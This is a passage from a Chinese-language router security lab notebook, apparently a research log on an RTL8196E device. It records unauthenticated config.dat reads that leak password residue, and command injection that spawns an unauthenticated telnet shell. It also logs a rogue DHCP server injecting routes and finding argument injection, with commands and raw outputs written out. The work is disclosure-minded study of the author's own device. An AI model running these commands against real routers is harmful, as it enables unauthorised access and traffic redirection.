@@ -2665,3 +2665,417 @@ config-region-20260818-1927-pre.bin  afc5e91d5c095dd19db761e6
 位址，測試會看起來正常而唯一的破綻是 `ttl=63` 不是 64 —— 儀器 bug 21。
 今晚第 8 步要把網卡改插 WAN 埠，那條規則在那一步同樣成立。
 
+
+## 更正一：這一場的標題日期寫錯了，而同一個錯在上一場的三張卡上更嚴重
+
+**本檔只追加，所以上面那個標題留在原地，更正寫在這裡。**
+
+上面那則計畫的標題寫「2026-08-19（三）」。**它是 2026-08-18（二）晚上寫的**，
+23:09 commit（`b88b932`），而系統時鐘在寫這一段的此刻是 `2026-08-18 23:41 CST`。
+所以那個標題是一個還沒到的日期。
+
+查的時候發現同一個錯在上一場，而且那裡它更貴：
+
+| 證據 | 時間 |
+|---|---|
+| `git log` `2ece97d`（進站實錄那一則） | **2026-08-18 21:55:39 +0800** |
+| `git log` `8a881e4`（推理那一半） | **2026-08-18 22:04:13 +0800** |
+| `dumps/p8-19-wan3.pcap` | **2026-08-18 21:35** |
+| `dumps/p8-19-routes.pcap`（本場最後一個 capture） | **2026-08-18 21:39** |
+| 但 `T-61` 卡片header 寫 | `2026-08-19 00:1x` |
+| `T-62` 寫 | `2026-08-19 00:4x–02:1x` |
+| `T-63` 寫 | `2026-08-19 02:2x` |
+
+**三張卡片的時間，在它們被 commit 的時候還沒有發生。** `T-62` 說它在
+`00:4x–02:1x` 之間做的那一輪 WAN 量測，它自己引用的 pcap 檔案時間是 21:35。
+
+這件事重要，是因為**這個檔案全部的權威來自「當時、實際、逐字」**。一張時間是
+編的的卡片，跟一張內容是編的的卡片，讀者沒有辦法分開 —— 而分不開的時候，
+理性的讀者兩張都不信。三張卡的**內容**沒有問題（pcap、console log、`ps` 輸出
+都在 `$FWRE_WORK/dumps/` 而且時間對得起來），錯的只有 header 上那個時間。
+
+**不改原文，理由是本檔只追加。** 讀那三張卡的人請把 header 的時間讀成
+「2026-08-18 21:2x–21:4x，實際時間見它們引用的檔案」。
+
+`tools/check-benchlog.py` 檢查 header 上**有沒有**時間，不檢查那個時間是不是
+可能的 —— 而它其實檢查得了：卡片時間不該晚於這個檔案被 commit 的時間。
+記成開放題。
+
+## 更正二：`P4-6` 的登記日期，與 `P9-9` 的 `amended` 欄
+
+同一個原因，兩個地方寫了 `2026-08-19`：
+
+- `reports/test-results.json` 的 `P4-6` 結果 → **重新登記一次 `--date 2026-08-18`**。
+  `rtcase record` 是追加的、`latest_results` 取最後一筆，所以這是這支工具本來就
+  設計好的路，登記簿會顯示跑了兩次。第一筆留在原地。
+- `test-cases.toml` 的 `P9-9` `amended` / `amend_reason` → 改成 `2026-08-18`。
+  那不在 freeze 的雜湊裡（freeze 只涵蓋 `id` / `predict` / `refute`），
+  而把一個錯的日期改成對的日期不是移動球門。
+
+---
+
+# 2026-08-18（二）W07 收尾場次 —— 實錄，寫在跑完之後
+
+**這一場沒有跑完，而停下來的方式是裝置不再開機。** 下面是實際打了什麼、
+實際看到什麼，照順序。
+
+```text
+T-64  —      第 2 站：A2.3 快照、IoC 預檢、H601 基準線      2026-08-18 23:12–23:14
+可行性: ★★★★★   驗證狀態(測前): —   依據: A2.3 · P9-9 的前半
+送出（逐字）: console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
+              然後 console-dump.py dump --at-prompt --flash 0x0 --length 0x10000
+                       --ram 0x81000000 --chunk 16384 -o …/config-region-20260819-w07close-pre.bin
+原始回應:
+      ok    <RealTek> - the boot loader is ours
+            ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
+      ok    control matched: 0b f0 00 04
+      ok    65536 bytes -> …/config-region-20260819-w07close-pre.bin
+      ok    sha256  67fb5858c479160d41336c10a543268aa85a8c29d17056c9895364a3163d777e
+      ok    4 chunks, 0 needed a re-read, 2.0 min
+      H601 (0x006000, 4096 bytes) sha256 前 24 字元:
+        flash-n150rt-console-1.bin           afc5e91d5c095dd19db761e6
+        config-region-20260818-1927-pre.bin  afc5e91d5c095dd19db761e6
+        config-region-20260819-w07close-pre.bin afc5e91d5c095dd19db761e6
+      IoC 預檢  COMPCS vs COMPDS : 0 / 343 differ
+      DHCP_MTU_SIZE  COMPDS='0'  COMPCS='0'
+      UPNP_ENABLED   COMPDS='0'  COMPCS='0'
+      ALG_SIP_ENABLED COMPDS='0' COMPCS='0'
+判定: ✅ 三個前提全部成立
+反證檢查: 測前寫「H601 在兩份快照之間改變 → 停下來，先弄清楚為什麼，不要按任何按鈕」，
+          實際七份快照（2026-08-16 到今天）的 0x6000 那 4 KiB **byte 完全相同**，
+          沒有觸發；而 IoC 的成功條件 0 / 343 也對上了（不是作業單範例裡那個 4）
+這一步燒掉了什麼: 一次上電
+驗證狀態(測後): dynamic   下一步: 第 3 站
+★ **檔名裡的 `20260819` 是錯的**，那是上面那個日期錯誤留下的。檔案本身沒問題，
+  重新命名會讓 sha 與這張卡對不上，所以留著，並在這裡說明。
+```
+
+```text
+T-65  —      make liveness 的第一次實戰（開放題 #73）        2026-08-18 23:18
+可行性: ★★★★★   驗證狀態(測前): —   依據: tools/device-liveness.py（今天寫的）
+送出（逐字）: 一發未認證 GET /config.dat，沒有憑證、沒有 shell
+原始回應:
+      device-liveness: http://10.1.1.1/config.dat -> 7510 bytes, 343 named fields
+        FAIL  DHCP_MTU_SIZE    expected 1500         got 0
+        ok    WAN_DHCP         expected 1            got 1
+        ok    OP_MODE          expected 0            got 0
+        ok    IP_ADDR          expected 10.1.1.1     got 10.1.1.1
+        ok    USER_PASSWORD    expected <non-empty>  got <set>
+        20 field(s) differ from the frozen baseline
+        11 field(s) not compared (redacted here, in the clear in the baseline)
+        verdict: BROKEN
+判定: ✅ 成立
+反證檢查: 測前寫「工具在一台已知壞掉的機器上回報 OK → 那它在任何機器上都回報 OK，
+          整支收掉重寫」，實際它回報 BROKEN 並指名 DHCP_MTU_SIZE，
+          沒有觸發。負面條件也成立：裝置沒上電時它回 exit 3（沒有量到東西），
+          不是 ok 也不是 FAIL
+這一步燒掉了什麼: 沒有
+驗證狀態(測後): dynamic   下一步: 無
+★ **這是開放題 #73 的正面回答。** 四場進站沒有一場注意到 WAN 從 2026-08-17 就斷了；
+  這一發花 0.02 秒、不需要憑證、不需要 shell，而且它自己說出壞的是哪一格、壞了會怎樣。
+```
+
+```text
+T-66  —      USER_PASSWORD 的殘留 byte，與兩條讀取路徑不一致  2026-08-18 23:14–23:20
+可行性: ★★★★   驗證狀態(測前): unverified   依據: 找別的東西時撞到的
+送出（逐字）: 把 T-64 那份快照的 COMPCS/COMPDS 與 2026-08-18 19:28 那份逐 entry
+              比較，包含 raw bytes 而不只是解碼後的值
+原始回應:
+      COMPCS: 1 of 343 entries differ when RAW bytes are compared too
+      COMPDS: 1 of 343 entries differ when RAW bytes are compared too
+        id=183 name='USER_PASSWORD'
+          08-18 19:28 raw=61646d696e00000000000000000000000000000000000000000000000000
+          08-18 23:14 raw=61646d696e00660000000000000000000000000000000000000000000000
+      header comp_len: 7498 -> 7501（兩個區都是）
+      而 HTTP 取回的同一格：
+          raw=61646d696e0000000000000000000000000000000000000000000000000000
+          header comp_len = 7498
+      序列埠讀到的 7510 bytes 與 HTTP 取回的 7510 bytes：7009 個 byte 不同
+判定: 🔶 部分 —— 機制成立，兩條路徑為什麼不一致沒有答完
+反證檢查: 測前寫「兩條獨立路徑讀到同一份 bytes → 那 A3.6 那條鏈成立，
+          而殘留是真的」，**實際兩條路徑不一致**，觸發了，所以這一格只能記成
+          部分：殘留在序列埠那條路上是確定的（同一份 dump 裡兩個區都有、
+          comp_len 跟著長 3、chunk 重讀驗證過、解碼 checksum 通過），
+          而它在 HTTP 那份裡不存在
+這一步燒掉了什麼: 沒有
+驗證狀態(測後): dynamic   下一步: 要回第 2 站再讀一次 0xC000 才分得出
+          「開機會重寫 COMPCS」與「/config.dat 不是 flash 的逐 byte 複本」——
+          **而那一步沒有做成，因為裝置在那之前就不再開機了**
+🔴 **機制本身是一個新的缺陷。** `0x66` 是 `'f'`，位在 C 字串結束符之後第一個 byte。
+  上一場 `P8-4` 把管理密碼改成一個暫時值再還原，**還原那一次寫入沒有把欄位清乾淨**，
+  前一個較長密碼的第 7 個字元留在 flash 裡。C 字串仍然是 `admin`，所以
+  **任何比較「解碼後的值」的工具都看不見它** —— 我自己第一輪跑出來的
+  「0 / 343 differ」就沒看見，是比 `raw` 才出來的。
+  配合未認證的 `GET /config.dat`（CVE-2019-19822），那是**一個已經被換掉的密碼的
+  部分明文，仍然讀得到**。
+🔴 **同一個殘留同時出現在 `COMPDS` 裡。** 那是「密碼寫入會同時寫出廠預設區」的
+  直接證人，一個 byte。
+⚠️ **暫時密碼的值不寫進本檔**，照 `docs/disclosure.md`。這裡記的是機制與位置。
+```
+
+```text
+T-67  —      裝置停止回應，而且此後不再開機                  2026-08-18 23:2x
+可行性: —      驗證狀態(測前): —   依據: —
+送出（逐字）: 先用 A3.23 的命令注入把 telnetd 起來（POST formSysCmd -> 302，
+              port 23 由 closed 變 OPEN），在那個 shell 上跑過
+                cat /proc/mtd · cat /proc/uptime · ls -l /web/config.dat
+                · grep -i documentroot /var/boa.conf      —— 四個都正常回應
+              然後送出下面八個，一次連線：
+                dd if=/dev/mtdblock0 bs=1 skip=49152 count=24 2>/dev/null | od -An -tx1
+                dd if=/dev/mtdblock0 bs=1 skip=32768 count=24 2>/dev/null | od -An -tx1
+                head -c 24 /web/config.dat | od -An -tx1
+                dd if=/dev/mtdblock0 bs=1 skip=49152 count=7510 2>/dev/null | md5sum
+                md5sum /web/config.dat
+                flash get DHCP_MTU_SIZE
+                flash get UPNP_ENABLED
+                flash get ALG_SIP_ENABLED
+原始回應:
+      八個命令全部回空。之後：
+        telnet 23        -> No route to host
+        curl http://10.1.1.1/ -> 000
+        ping             -> 100% packet loss
+        ip neigh 10.1.1.1 -> FAILED，之後 INCOMPLETE
+        序列埠 12 秒     -> 0 bytes
+      斷電重開之後（三次，其中兩次全程 catch 在送 ESC）：
+        序列埠 90 秒     -> 0 bytes
+        序列埠 120 秒    -> 0 bytes
+        ARP              -> INCOMPLETE
+        HTTP             -> 000
+      作者目視：**前面三顆燈同時亮、不閃，而那個狀態跟正常開機與 bootloader 都不一樣**
+判定: ⚠️ 裝置在本場之後不再開機
+反證檢查: 測前沒有為這一步寫條件 —— **它不是一個測試，它是一個意外**，
+          而本檔記的是實際發生的事。事後能檢驗的那一條是：
+          「板子還在執行，只是網路與 console 各自壞掉」→ 那要求兩個獨立的
+          子系統同時失效，而 **完整斷電重開之後 bootloader 一個字都不印**
+          否證了它：bootloader 的 banner 不經過 Linux、不經過網路
+這一步燒掉了什麼: **裝置本身，狀態未知**
+驗證狀態(測後): dynamic   下一步: 見下面「這一場燒掉了什麼」
+🔴 **最可能是我造成的，而我沒有辦法指認是八個命令裡的哪一個。**
+  最強的嫌疑是 `dd if=/dev/mtdblock0 bs=1 … count=7510`：那是對原始 MTD 區塊裝置
+  做 57,000 次單 byte 讀，而那顆 SPI flash 同時是 bootloader 與 kernel 的來源。
+  **但那是假設不是量測**，而且這一段的其他七個命令都還沒有被排除。
+🔴 **今晚沒有任何一個命令寫過 flash。** 第 2 站的 `FLR`/`DB` 是讀；`dd` 是讀；
+  `flash get` 是讀；命令注入寫的 `/var/web/` 是 ramfs。所以
+  **「把 flash 燒壞了」不是預期的結果** —— 但「不是預期」不等於「沒發生」，
+  而我現在沒有第二個儀器可以去看那顆 flash。
+🔴 **這件事本身回答了一個沒有人問過的問題：這台的 reset 按鈕救不了這個狀態。**
+  按鈕是 GPIO，由 `/bin/reload` 這個**使用者空間 daemon** 輪詢 `/proc/load_default`
+  才生效（今天下午從 `/bin/reload` 與 `ps` 讀出來的）。**Linux 沒起來，就沒有人
+  在讀那個按鈕。** 這台的原廠重置是軟體功能不是硬體功能，而那是一個
+  「照著使用手冊做也救不回來」的形狀。作者在現場問了「要不要按 reset」，
+  答案是不要——不只是因為它會毀掉 `P9-9`，更因為**它不會有任何作用**。
+```
+
+## 這一場燒掉了什麼
+
+- **開機循環 4 次**：第 2 站 1 次、第 3 站 1 次、之後兩次嘗試恢復（都沒有成功）。
+- **`telnetd -l /bin/sh` 起過一次**，沒有認證。裝置現在沒電，所以它不在了。
+- **`/var/web/` 下寫了幾個空檔案**（ramfs，不存在了）。
+- **裝置本身**：狀態未知，三顆燈同時亮，序列埠與網路都沒有回應。
+- `H601` **完全沒動**（進站時量過，七份快照一致）。
+- **`COMPCS` / `COMPDS` 的差異仍是 `0 / 343`**，`P9-9` **沒有執行**。
+
+## 下一場從哪裡開始
+
+**先講清楚 W07 的狀態**：登記簿 **56 / 58**。`P4-6` 今天在桌面關掉了；
+`P5-2` 是刻意不做的那一列；**`P9-9` 沒有量到，而且短期內量不到**。
+W07 收尾的時候要照這個寫，不要寫成「幾乎完成」。
+
+1. **實體層，依序，而且都不需要花錢**：
+   - 把 CP2102 從板子排針上**整個拔掉**，只留電源上電。USB 轉序列埠的 TX 腳
+     會經由板子 RX 腳的 ESD 二極體倒灌，這是這類板子「接了 UART 就不開機」
+     的經典症狀，而作業單裡「pin 1 的 VCC 不要接」那條規則是同一個問題的一半。
+   - 換一顆電源變壓器，或把圓孔插頭重插到底。**三顆燈同時亮而且不動，
+     也是電流不足的長相**：SoC 起不來、GPIO 沒有被接管、燈停在上電預設值。
+   - 網路線也拔掉，只留電源。
+2. **如果都沒有用，那條路要花錢，而 `docs/lab-inventory.md` 早就寫好了**：
+   Pico + SOIC-8 夾（約 US$10），`P9-5` / `P9-6` / `P9-7` / `P9-11` 四項本來就
+   卡在這一件事上。這個 repo 手上有**兩份互相驗證過的完整 4 MiB dump**
+   （sha `a800059a…`，2026-08-14 與 2026-08-16 各一份），所以「讀出來比對、
+   不一樣就寫回去」這條路是完整的 —— **缺的只有那個夾子。**
+   `docs/lab-inventory.md` 說「Pico + serprog」而不是 CH341A，理由是
+   **常見的黑色 CH341A 板子會在 3.3 V 的資料線上打 5 V**，而這台只有一個。
+3. **不要按 reset。** 理由在 `T-67` 的第三個 🔴：這台的 reset 是使用者空間
+   daemon 在輪詢 GPIO，Linux 沒起來就沒有人讀它。按下去不會有事，也不會有用，
+   但它會讓之後任何 `P9-9` 的結果多一個解釋不掉的變數。
+
+
+# 2026-08-19（三）W07 收尾場次 —— 實錄，後半（跨過午夜）
+
+**上面那一則停在「裝置不再開機」。它回來了，而且回來的方式本身是一個量測。**
+
+```text
+T-68  —      裝置為什麼不開機：三個實體測試，第一個就中           2026-08-19 00:0x
+可行性: ★★★★★   驗證狀態(測前): —   依據: T-67
+送出（逐字）: 依序三個，每一個之後都從網路量：
+              1. 把 CP2102 從板子排針上整個拔掉，只留電源，上電
+              2.（沒有做到）換電源變壓器
+              3.（沒有做到）連網路線也拔掉
+原始回應:
+      測試 1 之後：
+        ping 10.1.1.1   -> 0% packet loss
+        GET /           -> 200
+        make liveness   -> 7510 bytes, DHCP_MTU_SIZE=0, 20 fields drifted, verdict BROKEN
+判定: ✅ 第一個測試就成立
+反證檢查: 測前寫「三個都做完還是不開機 → 那不是外部連接的問題，
+          要靠離線讀 flash 才分得出，而這個 repo 沒有燒錄器」，
+          實際第一個測試就把它救回來了，沒有觸發
+這一步燒掉了什麼: 一次上電
+驗證狀態(測後): dynamic   下一步: 無
+🔴 **UART 轉接器接在排針上會讓這塊板子起不來，而這是量到的不是推的。**
+   USB 轉序列埠的 TX 腳在板子沒電或剛上電時，會經由板子 RX 腳的 ESD 二極體倒灌。
+   作業單裡「pin 1 的 `VCC` 不要接」那條規則是同一個問題的一半，而另一半沒有人寫下來。
+   **這件事會讓一整場進站看起來像磚頭。** 今晚它讓三次斷電重開全部量到零。
+★ 而它也解釋了為什麼前兩場都沒有踩到：那兩場沒有為了拔插電源反覆搬動機殼，
+  三根杜邦線（特別是 GND）沒有被帶鬆。
+```
+
+```text
+T-69  P9-9   Reset 按鈕：全場最後一發，而預測在按下去之前凍結    2026-08-19 00:0x
+可行性: ★★★★★   驗證狀態(測前): static   依據: /bin/reload · /bin/flash 的 usage
+送出（逐字）: 作者按下機殼上的 reset 鍵。**沒有從網路做**——網路那兩條路
+              （`echo 1 > /proc/load_default`、直接跑 `flash default-sw`）
+              是嚴格較弱的版本，留做備案
+原始回應（reset 前，一發未認證 GET /config.dat）:
+      7510 bytes · DHCP_MTU_SIZE=0 · UPNP_ENABLED=0 · ALG_SIP_ENABLED=0 · SSH_ENABLED=0
+      20 / 343 個具名欄位偏離 2026-08-16 基準線 · verdict BROKEN
+原始回應（reset 後）:
+      7490 bytes
+      sha256 e09cbf8428aa15944ed75939e79820c5ceff62990ebdfc65
+      2026-08-16 flash dump 的 0xC000 起 7490 bytes：**同一個 sha256，逐 byte 相同**
+      0 / 343 個具名欄位偏離 · verdict OK
+      DHCP_MTU_SIZE=1500 · UPNP_ENABLED=1 · ALG_SIP_ENABLED=1 · SSH_ENABLED=1
+      USER_PASSWORD 的殘留 byte（T-66）：沒有了
+      ifconfig eth1 -> MTU:1500（reset 前兩天都是 MTU:0）
+判定: ✅ 成立，三段全對
+反證檢查: 反證（a）測前寫「reset 之後那三個欄位仍然是 0 → 按鈕的復原來源是
+          flash 上的 DEFAULT_SETTING 區，而那個區是本專案自己寫壞的，
+          那時 P8-19 要升級成『跨越原廠重置』」，**實際三個欄位全部回來**，沒有觸發。
+          反證（b）測前寫「reset 之後 H601 的內容改變 → 出廠區的範圍判斷錯了」，
+          實際見 T-70，沒有觸發
+這一步燒掉了什麼: **這一場之前每一項站著的地面**——設定區被覆寫回出廠值，
+          `P0-5` 的 IoC 基準歸零（本來就是 0 / 343，所以這一次沒有損失），
+          `T-66` 那個密碼殘留的現場被抹掉（證據已經在快照裡）
+驗證狀態(測後): dynamic   下一步: `H601` 的逐 byte 比對還缺第 2 站那一份
+🔴 **`COMPDS` 自己是壞的，而按鈕還是把機器救回來了。** 那是這一列真正的答案：
+   按鈕寫的是**編譯進去的硬編碼表**，不是 flash 上那塊出廠預設區。所以
+   「未認證的 POST 把出廠預設區也寫壞了」這件事，**沒有**讓裝置失去復原能力。
+   靜態那一半在按下去之前就寫下來了：`/bin/reload` 輪詢 `/proc/load_default`
+   然後跑 `flash default-sw`，而 `/bin/flash` 的 usage 把
+   「default -- write all flash parameters **from hard code**」和
+   「reset -- reset current setting to default」分成兩個命令。
+🔴 **原本的預測今天不可測，而那是在按之前發現的。** 「reset 會把 COMPCS 覆寫回
+   COMPDS」——兩個區今天差 0 / 343，所以按下去分不出「有作用」與「沒作用」。
+   預測改了、`amend_reason` 寫了、freeze 從 `ef7ab66d…` 改成 `ea8cf733…`，
+   而那個 commit（`b88b932`）在按鈕之前。**這是這一整週唯一一次
+   「先改預測、再按不可逆的按鈕」，而順序在 git 裡看得見。**
+★ `P6-1`、`P8-7`、`P6-5` 三列同時解鎖，而且**完全不需要動 `A2.5`/`A2.6`**——
+  進站前的計畫說那是「唯一的路」，結果那條路根本不必走。
+```
+
+```text
+T-70  P9-9   H601 的第二個來源，同一次進站就答得出來             2026-08-19 00:0x
+可行性: ★★★★   驗證狀態(測前): —   依據: /bin/flash 的 allhw 子命令
+送出（逐字）: 命令注入起 telnetd（reset 重開機把上一個殺掉了），然後 `flash allhw`
+原始回應（per-unit 識別碼照 docs/disclosure.md 不逐字抄，這裡記結構）:
+      HW_BOARD_VER=2
+      HW_NIC0_ADDR / HW_NIC1_ADDR / HW_HW_WLAN0_WLAN_ADDR / WLAN_ADDR1..7  全部有值
+      HW_WLAN0_TX_POWER_CCK_A        = 2b2b2b2b29292929292727272727
+      HW_WLAN0_TX_POWER_HT40_1S_A    = 2f2f2f2f2d2d2d2d2d2c2c2c2c2c
+      HW_WLAN0_TX_POWER_DIFF_HT40_2S / DIFF_HT20 / DIFF_OFDM  全部有值
+      HW_WLAN0_REG_DOMAIN=1 · HW_WLAN0_RF_TYPE=10 · HW_WLAN0_LED_TYPE=7
+      HW_NIC0_ADDR 與線上 ARP 回應的 MAC、與 flash 0x006000 起的原始 bytes 三者一致
+判定: ✅ H601 UNCHANGED（解碼層）
+反證檢查: 測前寫「reset 之後 H601 的內容改變 → 出廠區的範圍判斷錯了，
+          這會直接影響 P0-3 的風險評估」，實際 MAC 與整組射頻校準表原封不動，
+          沒有觸發
+這一步燒掉了什麼: 沒有
+驗證狀態(測後): dynamic   下一步: **逐 byte 的那一份還沒做**——它要第 2 站，
+          而序列埠接上去板子就不開機（T-68）。「前」已經有七份且三天不變，
+          所以那個比對不會過期
+⚠️ **這是解碼後的視圖，不是原始 bytes。** 它不取代 `cmp`，它的價值是
+   **同一次進站就答得出來**——而今晚正好證明了那個價值：逐 byte 那一份沒有做成。
+```
+
+```text
+T-71  P8-19  WAN 行為那一半，以及三個選項一起送出去的路由注入   2026-08-19 00:0x–00:1x
+可行性: ★★★★   驗證狀態(測前): dynamic（第 2 次）   依據: T-69 之後 eth1 MTU:1500
+送出（逐字）: 網路卡從 LAN 埠改插 WAN 埠；主機 192.168.77.1/24；
+              sudo python3 tools/rogue-dhcp.py --iface enx… --server 192.168.77.1
+                --offer 192.168.77.100 --lease 600 --domain lab.invalid
+                --route 10.99.0.0/16=192.168.77.66 --seconds 140
+原始回應:
+      1  0.000000  0.0.0.0 → 255.255.255.255  DHCP Discover  xid 0x466c8296
+      2 14.049329  0.0.0.0 → 255.255.255.255  DHCP Discover  xid 0x3db9717c
+      3 14.050027  192.168.77.1 → …           DHCP Offer
+      4 14.059100  0.0.0.0 → …                DHCP Request
+      5 14.059511  192.168.77.1 → …           DHCP ACK
+      requested options: 1,33,121,249,3,6,12,15,28,44,46,47
+      裝置端 route -n（拔回 LAN 之後讀的）：
+        10.99.0.0  192.168.77.66  255.255.255.255  UGH  1  eth1
+        10.99.0.0  192.168.77.66  255.255.0.0      UG   1  eth1
+        0.0.0.0    192.168.77.1   0.0.0.0          UG   0  eth1
+      /var/wan_phy : interface eth1 / ip 192.168.77.100 / router 192.168.77.1
+                     / nameserver 192.168.77.1
+      /etc/resolv.conf : nameserver 192.168.77.1
+      WAN 側埠位：ICMP 回應；tcp/80 · 23 · 53 · 52869 · 52881 全部 filtered
+判定: ✅ 成立
+反證檢查: 測前寫「讀完發現 eth1.bound 對所有 DHCP 提供的值都加了引號，
+          或只透過 flash set 寫進 MIB 而不做字串展開 → 這條收掉」，
+          **實際 `/usr/share/udhcpc/eth1.bound` 整支 95 個 byte，
+          內容是一行 `sysconf conn dhcp $interface $ip $subnet $router $dns`，
+          四個值一個引號都沒有**，沒有觸發
+這一步燒掉了什麼: 裝置拿了一份我方的 DHCP 租約，`/etc/resolv.conf` 被換成我方位址，
+          核心轉送表多了兩條我方注入的路由（都在 RAM，重開即失）
+驗證狀態(測後): dynamic   下一步: 見下面兩個 🔴
+🔴 **上一場「宣告接受但從來沒送成」的路由注入，這一場送成了，而且兩種格式都吃。**
+   option 33（沒有遮罩，落成 `/32` host route）與 option 121/249（classless，`/16`）
+   **同時**進了核心轉送表。一台未認證的、位於這台路由器上游的 DHCP server，
+   可以把任意路由寫進它的轉送表，而**這台自己在 DISCOVER 裡點名索取這三個選項**。
+🔴 **而它在解析那些選項的時候把一個字串當成了 IPv4 位址。**
+   對照組是上一場：沒有注入路由的時候，ACK 之後三發免費 ARP 宣告的是
+   `192.168.77.100`——裝置自己的租約位址，間隔一秒。今晚同一段程式、
+   同樣三發、距 ACK 同樣的偏移，宣告的卻是 **`32.49.0.49`**，
+   而那四個 byte 是 `0x20 0x31 0x00 0x31` = ASCII 空白、`1`、NUL、`1`——
+   正是路由選項字串化之後 `…/16` 與 `192.168…` 中間那個「空白接 1」。
+   **它拿了一個字串裡跨越分隔符的四個 byte 去當位址。**
+⚠️ **沒有證明的兩件事，寫在這裡免得被讀成證明了**：
+   （一）33 / 121 / 249 三個裡是哪一個造成的——三個是一起送的，
+   那是為了確保送得到，代價是失去歸因；
+   （二）那個位址除了三發免費 ARP 之外有沒有走到別的地方——
+   它沒有變成介面位址，路由表裡也沒有它。
+⚠️ **精確一點，因為這裡很容易誇大**：POSIX `sh` 不會把展開的結果重新解析成命令，
+   所以這是**參數注入**不是命令注入。攻擊者能改變 `sysconf` 收到的 argv，
+   不能直接跑第二條命令。而 option 6 可以帶多個位址，`$dns` 就會變成
+   `"A B"`，`sysconf` 的參數位置就整排位移——那是下一場要送的那一發。
+```
+
+## 這一場燒掉了什麼（後半）
+
+- **開機循環 3 次**（第一次恢復嘗試、reset 自己重開、以及 reset 之後那次）。
+- **`telnetd -l /bin/sh` 起過兩次**，沒有認證。**收工斷電。**
+- **設定區被 reset 覆寫回出廠值** —— 這是刻意的，也是 `P9-9` 本身。
+  `T-66` 那個密碼殘留的現場沒有了（證據在 `config-region-20260819-w07close-pre.bin`）。
+- **裝置拿了一份我方的 DHCP 租約**，`/etc/resolv.conf` 指向 `192.168.77.1`，
+  轉送表多兩條注入路由（全部在 RAM）。
+- **裝置本身沒事**，收工前最後一次 `make liveness` 是 `verdict: OK`、0 / 343 偏離。
+
+## 下一場從哪裡開始
+
+**W07 收在 57 / 58。** `P5-2`（MIPS ret2libc）是刻意不做的那一列，理由不變。
+
+1. **接序列埠之前先解決 `T-68`。** 把三根杜邦線重新插緊（特別是 GND），
+   上電，**確認接著 CP2102 它仍然開得起來**。那一關沒過就不要排任何需要
+   第 2 站的工作——今晚有三次斷電重開因為這件事量到零。
+2. **`H601` 的逐 byte 比對**，以及 **reset 之後 `COMPDS` 的狀態**。
+   兩個都在第 2 站，一份 `A2.3` 快照同時給。**`COMPDS` 那一格是新的開放題**：
+   `flash default-sw` 有沒有把出廠預設區也寫回去？如果沒有，那 `P0-5` 的
+   IoC 基準從今天起是「乾淨的 `COMPCS` 對上壞掉的 `COMPDS`」，
+   而那個差值的意義跟這個專案一直以來假設的不一樣。
+3. **路由注入的歸因**：33、121、249 分三次單獨送，看哪一個產生
+   `32.49.0.49` 那三發 ARP。`tools/rogue-dhcp.py` 的 `--route` 已經寫好，
+   要加的是「只送其中一個選項」的旗標。
+4. **option 6 帶兩個 DNS 位址**，把 `$dns` 變成 `"A B"`，看 `sysconf` 的
+   argv 位移之後發生什麼。那是 `eth1.bound` 那一行最直接的追問。
+5. **不要在裝置上跑 `dd if=/dev/mtdblock0 bs=1`。** 見 `T-67`。
+
